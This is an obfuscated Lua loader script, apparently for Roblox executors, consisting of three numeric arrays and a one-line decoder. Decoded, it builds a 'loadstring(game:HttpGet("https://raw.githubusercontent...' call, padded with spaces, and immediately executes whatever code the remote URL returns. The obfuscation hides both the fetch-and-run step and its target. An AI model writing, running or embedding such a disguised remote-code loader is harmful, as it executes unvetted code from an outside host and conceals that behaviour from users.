local _LIl=getfenv and getfenv() or _ENV; local _X3=_LIl["\108\111\97\100\115\116\114\105\110\103"] or _LIl["\108\111\97\100"]; local _O0=_LIl["\115\116\114\105\110\103"]["\99\104\97\114"]; 
local _TBA={ 
{
1013,1021,995,1003,1030,1034,1032,1016,1028,1011,887,1015,1005,1031,1012,928,958,1048,1050,1039,
959,1021,1053,903,888,1030,1056,1058,1052,1055,943,923,925,1061,1024,1070,926,1042,1048,1067,
1045,1073,1037,1077,1070,1044,1072,1044,1070,1065,1079,1051,1071,1085,942,1050,1076,1074,952,1021,
1055,1087,1071,1087,1092,1064,1092,1062,1084,1059,1063,1085,1065,967,1026,1094,964,1096,1080,1077,
1077,1079,975,1111,1082,1086,1114,980,1096,1087,1081,1089,1121,987,1108,1086,1104,1116,992,1037,
995,1139,975,1003,996,1072,1128,1112,1136,1099,1107,1111,979,995,992,992,996,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,
859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859,859
}, 
{
101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,
121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,
141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,
161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,
181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,
201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,
100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100
}, 
{
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,
201,202,203,204,200,201,202,203,204,200,201,202,203,204,200,201,202,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,
200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200
}
};
local _R="";for _idx=1,#_TBA[1] do _R=_R.._O0((_TBA[1][_idx]-_TBA[2][_idx]-_TBA[3][_idx]-495)/2)end;_X3(_R)()

